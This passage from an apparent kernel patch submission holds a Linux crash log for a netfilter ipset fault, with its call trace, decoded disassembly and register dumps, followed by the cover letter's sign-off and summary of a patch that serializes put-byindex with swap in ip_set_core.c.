+[  193.268853] R13: ffffea0004175000 R14: ffff888100aa6a40 R15: ffffea0004175000
+[  193.269450]  get_partial_node.part.0+0x12d/0x300
+[  193.269836]  ? netlink_sendmsg (build/../include/linux/sched/signal.h:682 build/../include/net/scm.h:98 build/../net/netlink/af_netlink.c:1832)
+[  193.270187]  ? __sys_sendto (build/../net/socket.c:2258)
+[  193.270509]  ? __x64_sys_sendto (build/../net/socket.c:2268)
+[  193.270840]  ___slab_alloc (build/../mm/slub.c:3705 (discriminator 1) build/../mm/slub.c:4459 (discriminator 1))
+[  193.271206]  ? srso_alias_return_thunk (build/../arch/x86/lib/retpoline.S:220)
+[  193.271586]  ? ___slab_alloc (build/../include/linux/local_lock_internal.h:60 build/../mm/slub.c:4771 build/../mm/slub.c:4883 build/../mm/slub.c:5414)
+[  193.271903]  ? kmalloc_reserve (build/../net/core/skbuff.c:611 (discriminator 89))
+[  193.272237]  ? nfnetlink_rcv_msg (build/../net/netfilter/nfnetlink.c:160 build/../net/netfilter/nfnetlink.c:245)
+[  193.272585]  ? __alloc_skb (build/../net/core/skbuff.c:323 (discriminator 3) build/../net/core/skbuff.c:706 (discriminator 3))
+[  193.272890]  kmem_cache_alloc_node_noprof (build/../mm/slub.c:4756 (discriminator 1) build/../mm/slub.c:4883 (discriminator 1) build/../mm/slub.c:4950 (discriminator 1))
+[  193.273300]  kmalloc_reserve (build/../net/core/skbuff.c:611 (discriminator 89))
+[  193.273607]  __alloc_skb (build/../net/core/skbuff.c:686)
+[  193.273889]  netlink_ack (build/../arch/x86/include/asm/bitops.h:202 (discriminator 1) build/../arch/x86/include/asm/bitops.h:232 (discriminator 1) build/../include/asm-generic/bitops/instrumented-non-atomic.h:142 (discriminator 1) build/../net/netlink/af_netlink.c:2478 (discriminator 1))
+[  193.274181]  ? __pfx_nfnetlink_rcv_msg (build/../net/netfilter/nfnetlink.c:152 (discriminator 1))
+[  193.274547]  netlink_rcv_skb (build/../include/linux/netlink.h:18 build/../net/netlink/af_netlink.c:2536)
+[  193.274857]  netlink_unicast (build/../net/netlink/af_netlink.c:1148 (discriminator 2) build/../net/netlink/af_netlink.c:1338 (discriminator 2))
+[  193.275173]  netlink_sendmsg (build/../include/linux/sched/signal.h:682 build/../include/net/scm.h:98 build/../net/netlink/af_netlink.c:1832)
+[  193.275491]  __sys_sendto (build/../net/socket.c:2258)
+[  193.275794]  __x64_sys_sendto (build/../net/socket.c:2268)
+[  193.276119]  do_syscall_64 (build/../include/linux/sched/task_stack.h:23 build/../arch/x86/include/asm/entry-common.h:43 build/../include/linux/irq-entry-common.h:100 build/../include/linux/entry-common.h:174 build/../arch/x86/entry/syscall_64.c:89)
+[  193.276425]  entry_SYSCALL_64_after_hwframe (build/../arch/x86/entry/entry_64.S:121)
+[  193.276835] RIP: 0033:0x7ab935df6687
+[  193.277144] Code: 48 89 fa 4c 89 df e8 58 b3 00 00 8b 93 08 03 00 00 59 5e 48 83 f8 fc 74 1a 5b c3 0f 1f 84 00 00 00 00 00 48 8b 44 24 10 0f 05 <5b> c3 0f 1f 80 00 00 00 00 83 e2 39 83 fa 08 75 de e8 23 ff ff ff
+All code
+========
+   0:	48 89 fa             	mov    %rdi,%rdx
+   3:	4c 89 df             	mov    %r11,%rdi
+   6:	e8 58 b3 00 00       	call   0xb363
+   b:	8b 93 08 03 00 00    	mov    0x308(%rbx),%edx
+  11:	59                   	pop    %rcx
+  12:	5e                   	pop    %rsi
+  13:	48 83 f8 fc          	cmp    $0xfffffffffffffffc,%rax
+  17:	74 1a                	je     0x33
+  19:	5b                   	pop    %rbx
+  1a:	c3                   	ret
+  1b:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
+  22:	00 
+  23:	48 8b 44 24 10       	mov    0x10(%rsp),%rax
+  28:	0f 05                	syscall
+  2a:*	5b                   	pop    %rbx		<-- trapping instruction
+  2b:	c3                   	ret
+  2c:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
+  33:	83 e2 39             	and    $0x39,%edx
+  36:	83 fa 08             	cmp    $0x8,%edx
+  39:	75 de                	jne    0x19
+  3b:	e8 23 ff ff ff       	call   0xffffffffffffff63
+
+Code starting with the faulting instruction
+===========================================
+   0:	5b                   	pop    %rbx
+   1:	c3                   	ret
+   2:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
+   9:	83 e2 39             	and    $0x39,%edx
+   c:	83 fa 08             	cmp    $0x8,%edx
+   f:	75 de                	jne    0xffffffffffffffef
+  11:	e8 23 ff ff ff       	call   0xffffffffffffff39
+[  193.278614] RSP: 002b:00007ffeb471a2a0 EFLAGS: 00000202 ORIG_RAX: 000000000000002c
+[  193.279232] RAX: ffffffffffffffda RBX: 00007ab935d5f180 RCX: 00007ab935df6687
+[  193.279807] RDX: 000000000000002c RSI: 000057af975d4d18 RDI: 0000000000000003
+[  193.280379] RBP: 000057af975d4d18 R08: 00007ab935d64000 R09: 000000000000000c
+[  193.280961] R10: 0000000000000000 R11: 0000000000000202 R12: 0000000000001000
+[  193.281532] R13: 000057af975d7d30 R14: 00000000000006a0 R15: 000057af975d42bf
+[  193.282103]  </TASK>
+[  193.282286] Modules linked in:
+[  193.282590] ---[ end trace 0000000000000000 ]---
+[  193.282983] RIP: 0010:ip_set_put_byindex (build/../include/linux/rcupdate.h:839 build/../net/netfilter/ipset/ip_set_core.c:857 build/../net/netfilter/ipset/ip_set_core.c:869)
+[  193.283362] Code: c7 c7 d0 a4 74 85 e8 da de 31 00 8b 43 34 85 c0 74 18 83 e8 01 48 c7 c7 d0 a4 74 85 89 43 34 e8 d1 dc 31 00 5b e9 06 09 59 00 <0f> 0b 90 0f 1f 84 00 00 00 00 00 90 90 90 90 90 90 90 90 90 90 90
+All code
+========
+   0:	c7 c7 d0 a4 74 85    	mov    $0x8574a4d0,%edi
+   6:	e8 da de 31 00       	call   0x31dee5
+   b:	8b 43 34             	mov    0x34(%rbx),%eax
+   e:	85 c0                	test   %eax,%eax
+  10:	74 18                	je     0x2a
+  12:	83 e8 01             	sub    $0x1,%eax
+  15:	48 c7 c7 d0 a4 74 85 	mov    $0xffffffff8574a4d0,%rdi
+  1c:	89 43 34             	mov    %eax,0x34(%rbx)
+  1f:	e8 d1 dc 31 00       	call   0x31dcf5
+  24:	5b                   	pop    %rbx
+  25:	e9 06 09 59 00       	jmp    0x590930
+  2a:*	0f 0b                	ud2		<-- trapping instruction
+  2c:	90                   	nop
+  2d:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
+  34:	00 
+  35:	90                   	nop
+  36:	90                   	nop
+  37:	90                   	nop
+  38:	90                   	nop
+  39:	90                   	nop
+  3a:	90                   	nop
+  3b:	90                   	nop
+  3c:	90                   	nop
+  3d:	90                   	nop
+  3e:	90                   	nop
+  3f:	90                   	nop
+
+Code starting with the faulting instruction
+===========================================
+   0:	0f 0b                	ud2
+   2:	90                   	nop
+   3:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
+   a:	00 
+   b:	90                   	nop
+   c:	90                   	nop
+   d:	90                   	nop
+   e:	90                   	nop
+   f:	90                   	nop
+  10:	90                   	nop
+  11:	90                   	nop
+  12:	90                   	nop
+  13:	90                   	nop
+  14:	90                   	nop
+  15:	90                   	nop
+[  193.284848] RSP: 0018:ffffc90000108e30 EFLAGS: 00010246
+[  193.285280] RAX: 0000000000000000 RBX: ffff8881148e8040 RCX: ffff888110c454c0
+[  193.285860] RDX: 00000000000000ff RSI: 0000000000000000 RDI: ffffffff8574a4d4
+[  193.286435] RBP: ffff888110c45480 R08: ffff88813bca33e8 R09: ffffc90000108ee8
+[  193.287099] R10: 00000000000000bc R11: 00000000000007fc R12: ffff888110c454c0
+[  193.287884] R13: 0000000000000000 R14: ffffc90000108ee0 R15: ffffc90000108ee0
+[  193.288714] FS:  00007ab935d5f180(0000) GS:ffff88813bc80000(0000) knlGS:0000000000000000
+[  193.289450] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[  193.289992] CR2: 00007ab935d64000 CR3: 0000000105ae4004 CR4: 0000000000770ef0
+[  193.290776] PKRU: 55555554
+[  193.291103] Kernel panic - not syncing: Fatal exception in interrupt
+[  193.292036] Kernel Offset: disabled
+
+-----END crash log-----
+
+Best regards,
+Zhiling Zou
+
+Zhiling Zou (1):
+  netfilter: ipset: serialize kernel-side put-byindex with swap
+
+ net/netfilter/ipset/ip_set_core.c | 11 +++++++++--
+ 1 file changed, 9 insertions(+), 2 deletions(-)
+
 -- 
 2.43.0
 
